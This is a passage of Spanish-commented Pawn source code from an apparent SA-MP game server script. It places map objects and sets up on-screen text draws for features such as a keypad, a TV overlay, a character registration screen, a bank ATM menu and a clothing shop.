	CreateDynamicObject(2985,579.29998779,-2351.19995117,27.79999924,0.00000000,0.00000000,289.99328613); //object(minigun_base) (3)
	CreateDynamicObject(2985,576.79998779,-2349.39990234,27.79999924,0.00000000,0.00000000,189.98962402); //object(minigun_base) (4)
	CreateDynamicObject(2985,580.20001221,-2349.19995117,27.79999924,0.00000000,0.00000000,349.98657227); //object(minigun_base) (5)
	CreateDynamicObject(2985,466.29998779,-2353.00000000,27.79999924,0.00000000,0.00000000,289.98962402); //object(minigun_base) (6)
	CreateDynamicObject(2985,463.50000000,-2351.00000000,27.79999924,0.00000000,0.00000000,199.98962402); //object(minigun_base) (7)
	CreateDynamicObject(2985,466.60000610,-2350.10009766,27.79999924,0.00000000,0.00000000,19.98413086); //object(minigun_base) (8)
	CreateDynamicObject(8263,568.20001221,-2328.19995117,14.80000019,0.00000000,0.00000000,180.00000000); //object(vgsselecfence14) (1)
	CreateDynamicObject(8263,569.59997559,-2355.69995117,13.10000038,0.00000000,0.00000000,359.99450684); //object(vgsselecfence14) (2)
	CreateDynamicObject(8263,473.70001221,-2355.69995117,13.10000038,0.00000000,0.00000000,359.98901367); //object(vgsselecfence14) (3)
	CreateDynamicObject(987,501.29998779,-2324.30004883,1.50000000,0.00000000,0.00000000,90.00000000); //object(elecfence_bar) (1)
	CreateDynamicObject(987,501.39999390,-2312.39990234,1.50000000,0.00000000,0.00000000,180.00000000); //object(elecfence_bar) (2)
	CreateDynamicObject(3749,482.00000000,-2313.39990234,7.30000019,0.00000000,0.00000000,0.00000000); //object(clubgate01_lax) (1)
	CreateDynamicObject(987,472.10000610,-2312.39990234,1.50000000,0.00000000,0.00000000,179.99450684); //object(elecfence_bar) (3)
	CreateDynamicObject(987,460.10000610,-2312.39990234,1.50000000,0.00000000,0.00000000,179.99450684); //object(elecfence_bar) (4)
	CreateDynamicObject(987,448.20001221,-2312.39990234,1.50000000,0.00000000,0.00000000,269.99450684); //object(elecfence_bar) (5)
	CreateDynamicObject(1278,505.70001221,-2327.89990234,24.29999924,0.00000000,0.00000000,356.49841309); //object(sub_floodlite) (1)
	CreateDynamicObject(1278,444.39999390,-2327.19995117,24.29999924,0.00000000,0.00000000,356.49536133); //object(sub_floodlite) (2)
	CreateDynamicObject(3877,474.50000000,-2313.39990234,12.89999962,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,481.20001221,-2313.39990234,12.89999962,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (2)
	CreateDynamicObject(3877,488.89999390,-2313.39990234,12.89999962,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (3)
	CreateDynamicObject(3877,485.39999390,-2313.50000000,12.89999962,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (4)
	CreateDynamicObject(3877,477.89999390,-2313.30004883,12.89999962,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (5)
	CreateDynamicObject(3877,470.00000000,-2311.30004883,3.20000005,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,461.39999390,-2311.39990234,3.20000005,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (7)
	CreateDynamicObject(3877,452.00000000,-2311.39990234,3.29999995,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (8)
	CreateDynamicObject(3877,489.10000610,-2311.00000000,3.20000005,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (9)
	CreateDynamicObject(3877,498.60000610,-2311.30004883,3.09999990,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (10)
	CreateDynamicObject(9241,626.90002441,-2341.39990234,11.60000038,0.00000000,0.00000000,179.99450684); //object(copbits_sfn) (2)
	CreateDynamicObject(987,640.09997559,-2329.10009766,12.39999962,0.00000000,0.00000000,179.99450684); //object(elecfence_bar) (7)
	CreateDynamicObject(987,628.20001221,-2355.80004883,10.10000038,0.00000000,0.00000000,359.99450684); //object(elecfence_bar) (8)
	CreateDynamicObject(987,640.00000000,-2355.89990234,10.10000038,0.00000000,0.00000000,89.98901367); //object(elecfence_bar) (9)
	CreateDynamicObject(987,639.90002441,-2341.39990234,10.10000038,0.00000000,0.00000000,89.98901367); //object(elecfence_bar) (11)
	CreateDynamicObject(987,640.09997559,-2329.10009766,7.59999990,0.00000000,0.00000000,179.99450684); //object(elecfence_bar) (12)
	CreateDynamicObject(2985,641.50000000,-2342.60009766,9.89999962,0.00000000,0.00000000,0.00000000); //object(minigun_base) (9)
	CreateDynamicObject(2985,641.50000000,-2346.80004883,9.89999962,0.00000000,0.00000000,0.00000000); //object(minigun_base) (10)
	CreateDynamicObject(2985,641.50000000,-2337.80004883,9.89999962,0.00000000,0.00000000,0.00000000); //object(minigun_base) (11)
	CreateDynamicObject(2987,233.19999695,1823.30004883,7.59999990,0.00000000,0.00000000,270.00000000); //object(lxr_motel_doorsim) (1)
	CreateDynamicObject(2987,233.19999695,1821.80004883,7.59999990,0.00000000,0.00000000,270.00000000); //object(lxr_motel_doorsim) (2)
	CreateDynamicObject(2944,233.30000305,1823.50000000,7.69999981,0.00000000,0.00000000,0.00000000); //object(freight_sfw_door) (3)
	CreateDynamicObject(3386,214.00000000,1816.59997559,5.40000010,0.00000000,0.00000000,220.00000000); //object(a51_srack2_) (1)
	CreateDynamicObject(3388,214.69999695,1815.80004883,5.40000010,0.00000000,0.00000000,220.00000000); //object(a51_srack4_) (1)
	CreateDynamicObject(3393,215.00000000,1829.50000000,5.40000010,0.00000000,0.00000000,132.00000000); //object(a51_sdsk_ncol4_) (1)
	CreateDynamicObject(3795,223.00000000,1814.09997559,7.50000000,270.00000000,183.86346436,203.86352539); //object(missile_04_sfxr) (1)
	CreateDynamicObject(3795,219.69999695,1831.80004883,7.50000000,270.00000000,183.86169434,10.86230469); //object(missile_04_sfxr) (2)
	CreateDynamicObject(16782,215.10000610,1830.09997559,8.00000000,0.00000000,0.00000000,306.00000000); //object(a51_radar_scan) (1)
	CreateDynamicObject(1671,214.30000305,1819.90002441,5.90000010,0.00000000,0.00000000,300.00000000); //object(swivelchair_a) (1)
	CreateDynamicObject(1671,213.60000610,1822.90002441,5.90000010,0.00000000,0.00000000,269.99816895); //object(swivelchair_a) (2)
	CreateDynamicObject(1671,214.10000610,1825.30004883,5.90000010,0.00000000,0.00000000,239.99450684); //object(swivelchair_a) (3)
	CreateDynamicObject(2845,225.19999695,1828.09997559,6.19999981,0.00000000,0.00000000,0.00000000); //object(gb_bedclothes04) (1)
	CreateDynamicObject(2845,224.10000610,1828.00000000,6.19999981,0.00000000,0.00000000,0.00000000); //object(gb_bedclothes04) (2)
	CreateDynamicObject(2846,223.00000000,1829.19995117,6.00000000,0.00000000,0.00000000,0.00000000); //object(gb_bedclothes05) (1)
	CreateDynamicObject(2846,222.80000305,1828.19995117,6.00000000,0.00000000,0.00000000,0.00000000); //object(gb_bedclothes05) (2)

	// ---====[ Textdraws ]====---- //

	// Pizza
	PizzaTiempo = TextDrawCreate(61.000000, 287.000000, "_");
	TextDrawBackgroundColor(PizzaTiempo, 0x00000000);
	TextDrawFont(PizzaTiempo, 5);
	TextDrawLetterSize(PizzaTiempo, 0.500000, 1.000000);
	TextDrawColor(PizzaTiempo, -1);
	TextDrawSetOutline(PizzaTiempo, 1);
	TextDrawSetProportional(PizzaTiempo, 0);
	TextDrawUseBox(PizzaTiempo, 1);
	TextDrawBoxColor(PizzaTiempo, 0x00000000);
	TextDrawTextSize(PizzaTiempo, -60.000000, 50.000000);
	TextDrawSetPreviewModel(PizzaTiempo, 2881);
	TextDrawSetPreviewRot(PizzaTiempo, 180.000000, 0.000000, -55.000000, 1.000000);

	// KEYPAD (Fondo)
	KeyPad_Fondo = TextDrawCreate(206.000000, 56.000000+60.000000, "ld_dual:backgnd");
	TextDrawBackgroundColor(KeyPad_Fondo, 255);
	TextDrawFont(KeyPad_Fondo, 4);
	TextDrawLetterSize(KeyPad_Fondo, 0.500000, 1.000000);
	TextDrawColor(KeyPad_Fondo, -1);
	TextDrawSetOutline(KeyPad_Fondo, 0);
	TextDrawSetProportional(KeyPad_Fondo, 1);
	TextDrawSetShadow(KeyPad_Fondo, 1);
	TextDrawUseBox(KeyPad_Fondo, 1);
	TextDrawBoxColor(KeyPad_Fondo, 255);
	TextDrawTextSize(KeyPad_Fondo, 70.00000*MAX_KEY_NUMBERS, 100.000000/**MAX_KEY_NUMBERS*/);
	TextDrawSetSelectable(KeyPad_Fondo, 0);

	// TV
	TDTV[0] = TextDrawCreate(-10.000000, 0.000000, "_");
	TextDrawBackgroundColor(TDTV[0], 255);
	TextDrawFont(TDTV[0], 1);
	TextDrawLetterSize(TDTV[0], 0.600000, 3.000000);
	TextDrawColor(TDTV[0], -1);
	TextDrawSetOutline(TDTV[0], 0);
	TextDrawSetProportional(TDTV[0], 1);
	TextDrawSetShadow(TDTV[0], 1);
	TextDrawUseBox(TDTV[0], 1);
	TextDrawBoxColor(TDTV[0], 255);
	TextDrawTextSize(TDTV[0], 640.000000, 0.000000);

	TDTV[1] = TextDrawCreate(-10.000000, 426.000000, "_");
	TextDrawBackgroundColor(TDTV[1], 255);
	TextDrawFont(TDTV[1], 1);
	TextDrawLetterSize(TDTV[1], 0.600000, 3.000000);
	TextDrawColor(TDTV[1], -1);
	TextDrawSetOutline(TDTV[1], 0);
	TextDrawSetProportional(TDTV[1], 1);
	TextDrawSetShadow(TDTV[1], 1);
	TextDrawUseBox(TDTV[1], 1);
	TextDrawBoxColor(TDTV[1], 255);
	TextDrawTextSize(TDTV[1], 640.000000, 0.000000);

	TDTV[2] = TextDrawCreate(260.000000, 0.000000, "~r~L~g~E~b~D");
	TextDrawBackgroundColor(TDTV[2], -1);
	TextDrawFont(TDTV[2], 1);
	TextDrawLetterSize(TDTV[2], 1.159999, 2.199999);
	TextDrawColor(TDTV[2], -1);
	TextDrawSetOutline(TDTV[2], 1);
	TextDrawSetProportional(TDTV[2], 1);
	TextDrawUseBox(TDTV[2], 1);
	TextDrawBoxColor(TDTV[2], 255);
	TextDrawTextSize(TDTV[2], 330.000000, 0.000000);

	TDTV[3] = TextDrawCreate(586.000000, 422.000000, "l");
	TextDrawBackgroundColor(TDTV[3], 255);
	TextDrawFont(TDTV[3], 1);
	TextDrawLetterSize(TDTV[3], 0.899999, 1.299998);
	TextDrawColor(TDTV[3], 16777215);
	TextDrawSetOutline(TDTV[3], 0);
	TextDrawSetProportional(TDTV[3], 1);
	TextDrawSetShadow(TDTV[3], 1);

	TDTV[4] = TextDrawCreate(580.000000, 421.000000, "o");
	TextDrawBackgroundColor(TDTV[4], 255);
	TextDrawFont(TDTV[4], 2);
	TextDrawLetterSize(TDTV[4], 0.759999, 3.200000);
	TextDrawColor(TDTV[4], 16777215);
	TextDrawSetOutline(TDTV[4], 0);
	TextDrawSetProportional(TDTV[4], 1);
	TextDrawSetShadow(TDTV[4], 1);

	TDTV[5] = TextDrawCreate(246.000000, 4.000000, "~<~");
	TextDrawBackgroundColor(TDTV[5], 255);
	TextDrawFont(TDTV[5], 1);
	TextDrawLetterSize(TDTV[5], 0.529999, 1.299999);
	TextDrawColor(TDTV[5], -1);
	TextDrawSetOutline(TDTV[5], 0);
	TextDrawSetProportional(TDTV[5], 1);
	TextDrawSetShadow(TDTV[5], 1);

	TDTV[6] = TextDrawCreate(326.000000, 4.000000, "~>~");
	TextDrawBackgroundColor(TDTV[6], 255);
	TextDrawFont(TDTV[6], 1);
	TextDrawLetterSize(TDTV[6], 0.529999, 1.299999);
	TextDrawColor(TDTV[6], -1);
	TextDrawSetOutline(TDTV[6], 0);
	TextDrawSetProportional(TDTV[6], 1);
	TextDrawSetShadow(TDTV[6], 1);

	TDTV[7] = TextDrawCreate(316.000000, 424.000000, "~>~");
	TextDrawBackgroundColor(TDTV[7], 255);
	TextDrawFont(TDTV[7], 1);
	TextDrawLetterSize(TDTV[7], 0.579999, 2.000000);
	TextDrawColor(TDTV[7], -1);
	TextDrawSetOutline(TDTV[7], 0);
	TextDrawSetProportional(TDTV[7], 1);
	TextDrawSetShadow(TDTV[7], 1);

	TDTV[8] = TextDrawCreate(246.000000, 424.000000, "~<~");
	TextDrawBackgroundColor(TDTV[8], 255);
	TextDrawFont(TDTV[8], 1);
	TextDrawLetterSize(TDTV[8], 0.579999, 2.000000);
	TextDrawColor(TDTV[8], -1);
	TextDrawSetOutline(TDTV[8], 0);
	TextDrawSetProportional(TDTV[8], 1);
	TextDrawSetShadow(TDTV[8], 1);

 	TV_Azul = TextDrawCreate(-10.000000, 30.000000, "_");
	TextDrawBackgroundColor(TV_Azul, 255);
	TextDrawFont(TV_Azul, 1);
	TextDrawLetterSize(TV_Azul, 0.400000, 43.300010);
	TextDrawColor(TV_Azul, C_AZUL);
	TextDrawSetOutline(TV_Azul, 0);
	TextDrawSetProportional(TV_Azul, 1);
	TextDrawSetShadow(TV_Azul, 1);
	TextDrawUseBox(TV_Azul, 1);
	TextDrawBoxColor(TV_Azul, C_AZUL);
	TextDrawTextSize(TV_Azul, 640.000000, 0.000000);

	TV_Apagado = TextDrawCreate(-10.000000, 30.000000, "_");
	TextDrawBackgroundColor(TV_Apagado, 255);
	TextDrawFont(TV_Apagado, 1);
	TextDrawLetterSize(TV_Apagado, 0.400000, 43.300010);
	TextDrawColor(TV_Apagado, -1);
	TextDrawSetOutline(TV_Apagado, 0);
	TextDrawSetProportional(TV_Apagado, 1);
	TextDrawSetShadow(TV_Apagado, 1);
	TextDrawUseBox(TV_Apagado, 1);
	TextDrawBoxColor(TV_Apagado, 255);
	TextDrawTextSize(TV_Apagado, 640.000000, 0.000000);

	HS = TextDrawCreate(332.000000, 432.000000, "hs");
	TextDrawBackgroundColor(HS, 255);
	TextDrawFont(HS, 3);
	TextDrawLetterSize(HS, 0.400000, 1.000000);
	TextDrawColor(HS, -1);
	TextDrawSetOutline(HS, 1);
	TextDrawSetProportional(HS, 1);

	Barraversion = TextDrawCreate(1.000000, 429.000000, "~b~~h~~h~v2");
	TextDrawBackgroundColor(Barraversion, 255);
	TextDrawFont(Barraversion, 3);
	TextDrawLetterSize(Barraversion, 0.500002, 2.000000);
	TextDrawColor(Barraversion, -1);
	TextDrawSetOutline(Barraversion, 1);
	TextDrawSetProportional(Barraversion, 1);
	TextDrawUseBox(Barraversion, 1);
	TextDrawBoxColor(Barraversion, 336860310);
	TextDrawTextSize(Barraversion, 643.000000, 2.000000);

    HoraB = TextDrawCreate(260.000000, 427.000000, "~b~~h~~h~00:00");
	TextDrawBackgroundColor(HoraB, 255);
	TextDrawFont(HoraB, 3);
	TextDrawLetterSize(HoraB, 0.700000, 2.000000);
	TextDrawColor(HoraB, -1);
	TextDrawSetOutline(HoraB, 1);
	TextDrawSetProportional(HoraB, 1);

	CAMARA_Seg[0] = TextDrawCreate(0.000000, 0.000000, "ld_none:tvcorn");
	TextDrawBackgroundColor(CAMARA_Seg[0], 255);
	TextDrawFont(CAMARA_Seg[0], 4);
	TextDrawLetterSize(CAMARA_Seg[0], 0.500000, 1.000000);
	TextDrawColor(CAMARA_Seg[0], -1);
	TextDrawSetOutline(CAMARA_Seg[0], 0);
	TextDrawSetProportional(CAMARA_Seg[0], 1);
	TextDrawSetShadow(CAMARA_Seg[0], 1);
	TextDrawUseBox(CAMARA_Seg[0], 1);
	TextDrawBoxColor(CAMARA_Seg[0], 255);
	TextDrawTextSize(CAMARA_Seg[0], 316.000000, 193.000000);

	CAMARA_Seg[1] = TextDrawCreate(640.000000, 0.000000, "ld_none:tvcorn");
	TextDrawBackgroundColor(CAMARA_Seg[1], 255);
	TextDrawFont(CAMARA_Seg[1], 4);
	TextDrawLetterSize(CAMARA_Seg[1], 0.500000, 1.000000);
	TextDrawColor(CAMARA_Seg[1], -1);
	TextDrawSetOutline(CAMARA_Seg[1], 0);
	TextDrawSetProportional(CAMARA_Seg[1], 1);
	TextDrawSetShadow(CAMARA_Seg[1], 1);
	TextDrawUseBox(CAMARA_Seg[1], 1);
	TextDrawBoxColor(CAMARA_Seg[1], 255);
	TextDrawTextSize(CAMARA_Seg[1], -324.000000, 206.000000);

	CAMARA_Seg[2] = TextDrawCreate(640.000000, 449.000000, "ld_none:tvcorn");
	TextDrawBackgroundColor(CAMARA_Seg[2], 255);
	TextDrawFont(CAMARA_Seg[2], 4);
	TextDrawLetterSize(CAMARA_Seg[2], 0.500000, 1.000000);
	TextDrawColor(CAMARA_Seg[2], -1);
	TextDrawSetOutline(CAMARA_Seg[2], 0);
	TextDrawSetProportional(CAMARA_Seg[2], 1);
	TextDrawSetShadow(CAMARA_Seg[2], 1);
	TextDrawUseBox(CAMARA_Seg[2], 1);
	TextDrawBoxColor(CAMARA_Seg[2], 255);
	TextDrawTextSize(CAMARA_Seg[2], -324.000000, -258.000000);

	CAMARA_Seg[3] = TextDrawCreate(-2.000000, 451.000000, "ld_none:tvcorn");
	TextDrawBackgroundColor(CAMARA_Seg[3], 255);
	TextDrawFont(CAMARA_Seg[3], 4);
	TextDrawLetterSize(CAMARA_Seg[3], 0.500000, 1.000000);
	TextDrawColor(CAMARA_Seg[3], -1);
	TextDrawSetOutline(CAMARA_Seg[3], 0);
	TextDrawSetProportional(CAMARA_Seg[3], 1);
	TextDrawSetShadow(CAMARA_Seg[3], 1);
	TextDrawUseBox(CAMARA_Seg[3], 1);
	TextDrawBoxColor(CAMARA_Seg[3], 255);
	TextDrawTextSize(CAMARA_Seg[3], 344.000000, -276.000000);

	Registro[0] = TextDrawCreate(593.000000, 130.000000, "_");
	TextDrawBackgroundColor(Registro[0], 255);
	TextDrawFont(Registro[0], 1);
	TextDrawLetterSize(Registro[0], 0.500000, 5.099998);
	TextDrawColor(Registro[0], -1);
	TextDrawSetOutline(Registro[0], 0);
	TextDrawSetProportional(Registro[0], 1);
	TextDrawSetShadow(Registro[0], 1);
	TextDrawUseBox(Registro[0], 1);
	TextDrawBoxColor(Registro[0], 100);
	TextDrawTextSize(Registro[0], 440.000000, 10.000000);

	Registro[1] = TextDrawCreate(593.000000, 185.000000, "_");
	TextDrawBackgroundColor(Registro[1] , 255);
	TextDrawFont(Registro[1] , 1);
	TextDrawLetterSize(Registro[1] , 0.500000, 5.099998);
	TextDrawColor(Registro[1] , -1);
	TextDrawSetOutline(Registro[1], 0);
	TextDrawSetProportional(Registro[1] , 1);
	TextDrawSetShadow(Registro[1] , 1);
	TextDrawUseBox(Registro[1], 1);
	TextDrawBoxColor(Registro[1] , 100);
	TextDrawTextSize(Registro[1] , 440.000000, 10.000000);

	Registro[2] = TextDrawCreate(593.000000, 240.000000, "_");
	TextDrawBackgroundColor(Registro[2], 255);
	TextDrawFont(Registro[2], 1);
	TextDrawLetterSize(Registro[2], 0.500000, 5.099998);
	TextDrawColor(Registro[2], -1);
	TextDrawSetOutline(Registro[2], 0);
	TextDrawSetProportional(Registro[2], 1);
	TextDrawSetShadow(Registro[2], 1);
	TextDrawUseBox(Registro[2], 1);
	TextDrawBoxColor(Registro[2], 100);
	TextDrawTextSize(Registro[2], 440.000000, 10.000000);

	Registro[3] = TextDrawCreate(593.000000, 295.000000, "_");
	TextDrawBackgroundColor(Registro[3], 255);
	TextDrawFont(Registro[3], 1);
	TextDrawLetterSize(Registro[3], 0.500000, 5.099998);
	TextDrawColor(Registro[3], -1);
	TextDrawSetOutline(Registro[3], 0);
	TextDrawSetProportional(Registro[3], 1);
	TextDrawSetShadow(Registro[3], 1);
	TextDrawUseBox(Registro[3], 1);
	TextDrawBoxColor(Registro[3], 100);
	TextDrawTextSize(Registro[3], 440.000000, 10.000000);

	BOXTuto[0] = TextDrawCreate(650.000000, 0.000000, "_");
	TextDrawBackgroundColor(BOXTuto[0], 255);
	TextDrawFont(BOXTuto[0], 1);
	TextDrawLetterSize(BOXTuto[0], 0.500000, 11.799999);
	TextDrawColor(BOXTuto[0], -1);
	TextDrawSetOutline(BOXTuto[0], 0);
	TextDrawSetProportional(BOXTuto[0], 1);
	TextDrawSetShadow(BOXTuto[0], 1);
	TextDrawUseBox(BOXTuto[0], 1);
	TextDrawBoxColor(BOXTuto[0], 255);
	TextDrawTextSize(BOXTuto[0], -20.000000, 0.000000);

	BOXTuto[1] = TextDrawCreate(650.000000, 342.000000, "_");
	TextDrawBackgroundColor(BOXTuto[1], 255);
	TextDrawFont(BOXTuto[1], 1);
	TextDrawLetterSize(BOXTuto[1], 0.500000, 11.799999);
	TextDrawColor(BOXTuto[1], -1);
	TextDrawSetOutline(BOXTuto[1], 0);
	TextDrawSetProportional(BOXTuto[1], 1);
	TextDrawSetShadow(BOXTuto[1], 1);
	TextDrawUseBox(BOXTuto[1], 1);
	TextDrawBoxColor(BOXTuto[1], 255);
	TextDrawTextSize(BOXTuto[1], -20.000000, 0.000000);

	Registro[4] = TextDrawCreate(479.000000, 130.000000, "sexo~n~~n~~n~edad~n~~n~~n~pelea~n~~n~~n~estilo");
	TextDrawBackgroundColor(Registro[4], 255);
	TextDrawFont(Registro[4], 2);
	TextDrawLetterSize(Registro[4], 0.589999, 2.000000);
	TextDrawColor(Registro[4], -1);
	TextDrawSetOutline(Registro[4], 1);
	TextDrawSetProportional(Registro[4], 1);

	Fondo_Licencia = TextDrawCreate(268.000000, 185.000000, "ld_drv:nawtxt");
	TextDrawBackgroundColor(Fondo_Licencia, 255);
	TextDrawFont(Fondo_Licencia, 4);
	TextDrawLetterSize(Fondo_Licencia, 2.200000, 18.000000);
	TextDrawColor(Fondo_Licencia, -1);
	TextDrawSetOutline(Fondo_Licencia, 0);
	TextDrawSetProportional(Fondo_Licencia, 1);
	TextDrawSetShadow(Fondo_Licencia, 1);
	TextDrawUseBox(Fondo_Licencia, 1);
	TextDrawBoxColor(Fondo_Licencia, 255);
	TextDrawTextSize(Fondo_Licencia, 139.000000, 119.000000);
	TextDrawSetSelectable(Fondo_Licencia, 0);

	//SISTEMA DE BANCO
	//Normales (BOXS)
	Cajero[0] = TextDrawCreate(0.000000, 0.000000, "_");
	TextDrawBackgroundColor(Cajero[0], 255);
	TextDrawFont(Cajero[0], 1);
	TextDrawLetterSize(Cajero[0], 0.500000, 54.000000);
	TextDrawColor(Cajero[0], -1);
	TextDrawSetOutline(Cajero[0], 0);
	TextDrawSetProportional(Cajero[0], 1);
	TextDrawSetShadow(Cajero[0], 1);
	TextDrawUseBox(Cajero[0], 1);
	TextDrawBoxColor(Cajero[0], 56575);
	TextDrawTextSize(Cajero[0], 650.000000, 0.000000);

	Cajero[1] = TextDrawCreate(30.000000, 154.000000, "_");
	TextDrawBackgroundColor(Cajero[1], 255);
	TextDrawFont(Cajero[1], 2);
	TextDrawLetterSize(Cajero[1], 0.820000, 26.000000);
	TextDrawColor(Cajero[1], -1);
	TextDrawSetOutline(Cajero[1], 0);
	TextDrawSetProportional(Cajero[1], 1);
	TextDrawSetShadow(Cajero[1], 1);
	TextDrawUseBox(Cajero[1], 1);
	TextDrawBoxColor(Cajero[1], 255);
	TextDrawTextSize(Cajero[1], 620.000000, 50.000000);

	Cajero[2] = TextDrawCreate(190.000000, 159.000000, "operaciones disponibles:");
	TextDrawBackgroundColor(Cajero[2], 255);
	TextDrawFont(Cajero[2], 2);
	TextDrawLetterSize(Cajero[2], 0.419999, 3.000000);
	TextDrawColor(Cajero[2], -1);
	TextDrawSetOutline(Cajero[2], 0);
	TextDrawSetProportional(Cajero[2], 1);
	TextDrawSetShadow(Cajero[2], 1);

	//CLICKEABLES:

	Registro[5] = TextDrawCreate(472.000000, 357.000000, "TERMINAR");
	TextDrawBackgroundColor(Registro[5], 255);
	TextDrawFont(Registro[5], 1);
	TextDrawLetterSize(Registro[5], 0.559999, 2.699999);
	TextDrawColor(Registro[5], -1);
	TextDrawSetOutline(Registro[5], 0);
	TextDrawSetProportional(Registro[5], 1);
	TextDrawSetShadow(Registro[5], 1);
	TextDrawUseBox(Registro[5], 1);
	TextDrawBoxColor(Registro[5], 100);
	TextDrawTextSize(Registro[5], 560.000000, 30.000000);

	//Sexo
	FlechaSexo[0] = TextDrawCreate(420.000000, 135.000000, "<");
	TextDrawBackgroundColor(FlechaSexo[0], 255);
	TextDrawFont(FlechaSexo[0], 1);
	TextDrawLetterSize(FlechaSexo[0], 1.069998, 4.199998);
	TextDrawColor(FlechaSexo[0], -1);
	TextDrawSetOutline(FlechaSexo[0], 1);
	TextDrawSetProportional(FlechaSexo[0], 1);
	TextDrawUseBox(FlechaSexo[0], 1);
	TextDrawBoxColor(FlechaSexo[0], 0);
	TextDrawTextSize(FlechaSexo[0],  442.000000, 30.000000);

	FlechaSexo[1] = TextDrawCreate(587.000000, 135.000000, ">");
	TextDrawBackgroundColor(FlechaSexo[1], 255);
	TextDrawFont(FlechaSexo[1], 1);
	TextDrawLetterSize(FlechaSexo[1], 0.899999, 4.299997);
	TextDrawColor(FlechaSexo[1], -1);
	TextDrawSetOutline(FlechaSexo[1], 1);
	TextDrawSetProportional(FlechaSexo[1], 1);
	TextDrawUseBox(FlechaSexo[1], 1);
	TextDrawBoxColor(FlechaSexo[1], 0);
	TextDrawTextSize(FlechaSexo[1], 612.000000, 30.000000);

	//Edad
	FlechaEdad[0] = TextDrawCreate(421.000000, 188.000000, "<");
	TextDrawBackgroundColor(FlechaEdad[0], 255);
	TextDrawFont(FlechaEdad[0], 1);
	TextDrawLetterSize(FlechaEdad[0], 1.019999, 4.400000);
	TextDrawColor(FlechaEdad[0], -1);
	TextDrawSetOutline(FlechaEdad[0], 1);
	TextDrawSetProportional(FlechaEdad[0], 1);
	TextDrawUseBox(FlechaEdad[0], 1);
	TextDrawBoxColor(FlechaEdad[0], 0);
	TextDrawTextSize(FlechaEdad[0],442.000000, 30.000000);

	FlechaEdad[1] = TextDrawCreate(586.000000, 187.000000, ">");
	TextDrawBackgroundColor(FlechaEdad[1], 255);
	TextDrawFont(FlechaEdad[1], 1);
	TextDrawLetterSize(FlechaEdad[1], 0.959999, 4.299999);
	TextDrawColor(FlechaEdad[1], -1);
	TextDrawSetOutline(FlechaEdad[1], 1);
	TextDrawSetProportional(FlechaEdad[1], 1);
	TextDrawUseBox(FlechaEdad[1], 1);
	TextDrawBoxColor(FlechaEdad[1], 0);
	TextDrawTextSize(FlechaEdad[1], 612.000000, 30.000000);

	//Pelea
	FlechaPelea[0] = TextDrawCreate(420.000000, 241.000000, "<");
	TextDrawBackgroundColor(FlechaPelea[0], 255);
	TextDrawFont(FlechaPelea[0], 1);
	TextDrawLetterSize(FlechaPelea[0], 1.089999, 4.500000);
	TextDrawColor(FlechaPelea[0], -1);
	TextDrawSetOutline(FlechaPelea[0], 1);
	TextDrawSetProportional(FlechaPelea[0], 1);
	TextDrawUseBox(FlechaPelea[0], 1);
	TextDrawBoxColor(FlechaPelea[0], 0);
	TextDrawTextSize(FlechaPelea[0],442.000000, 30.000000);

	FlechaPelea[1] = TextDrawCreate(587.000000, 244.000000, ">");
	TextDrawBackgroundColor(FlechaPelea[1], 255);
	TextDrawFont(FlechaPelea[1], 1);
	TextDrawLetterSize(FlechaPelea[1], 0.920000, 4.199999);
	TextDrawColor(FlechaPelea[1], -1);
	TextDrawSetOutline(FlechaPelea[1], 1);
	TextDrawSetProportional(FlechaPelea[1], 1);
	TextDrawUseBox(FlechaPelea[1], 1);
	TextDrawBoxColor(FlechaPelea[1], 0);
	TextDrawTextSize(FlechaPelea[1],612.000000, 30.000000);

	//Estilo
	FlechaEstilo[0] = TextDrawCreate(423.000000, 296.000000, "<");
	TextDrawBackgroundColor(FlechaEstilo[0], 255);
	TextDrawFont(FlechaEstilo[0], 1);
	TextDrawLetterSize(FlechaEstilo[0], 0.980000, 4.700000);
	TextDrawColor(FlechaEstilo[0], -1);
	TextDrawSetOutline(FlechaEstilo[0], 1);
	TextDrawSetProportional(FlechaEstilo[0], 1);
	TextDrawUseBox(FlechaEstilo[0], 1);
	TextDrawBoxColor(FlechaEstilo[0], 0);
	TextDrawTextSize(FlechaEstilo[0], 442.000000, 30.000000);

	FlechaEstilo[1] = TextDrawCreate(587.000000, 298.000000, ">");
	TextDrawBackgroundColor(FlechaEstilo[1], 255);
	TextDrawFont(FlechaEstilo[1], 1);
	TextDrawLetterSize(FlechaEstilo[1], 0.980000, 4.399999);
	TextDrawColor(FlechaEstilo[1], -1);
	TextDrawSetOutline(FlechaEstilo[1], 1);
	TextDrawSetProportional(FlechaEstilo[1], 1);
	TextDrawUseBox(FlechaEstilo[1], 1);
	TextDrawBoxColor(FlechaEstilo[1], 0);
	TextDrawTextSize(FlechaEstilo[1], 612.000000, 30.000000);

	//Binco
	FlechaCRopa[0] = TextDrawCreate(160.000000, 190.000000, "~<~");
	TextDrawBackgroundColor(FlechaCRopa[0], 255);
	TextDrawFont(FlechaCRopa[0], 1);
	TextDrawLetterSize(FlechaCRopa[0], 1.800000, 4.400000);
	TextDrawColor(FlechaCRopa[0], -1);
	TextDrawSetOutline(FlechaCRopa[0], 0);
	TextDrawSetProportional(FlechaCRopa[0], 1);
	TextDrawSetShadow(FlechaCRopa[0], 1);
	TextDrawBoxColor(FlechaCRopa[0], 255);
	TextDrawTextSize(FlechaCRopa[0], 200.000000, 80);

	FlechaCRopa[1] = TextDrawCreate(427.000000, 193.000000, "~>~");
	TextDrawBackgroundColor(FlechaCRopa[1], 255);
	TextDrawFont(FlechaCRopa[1], 1);
	TextDrawLetterSize(FlechaCRopa[1], 1.800000, 4.400000);
	TextDrawColor(FlechaCRopa[1], -1);
	TextDrawSetOutline(FlechaCRopa[1], 1);
	TextDrawSetProportional(FlechaCRopa[1], 1);
	TextDrawBoxColor(FlechaCRopa[1], 255);
	TextDrawTextSize(FlechaCRopa[1], 463.000000,80);

	CRopa = TextDrawCreate(400.000000, 340.000000, "comprar");
	TextDrawBackgroundColor(CRopa, 255);
	TextDrawFont(CRopa, 3);
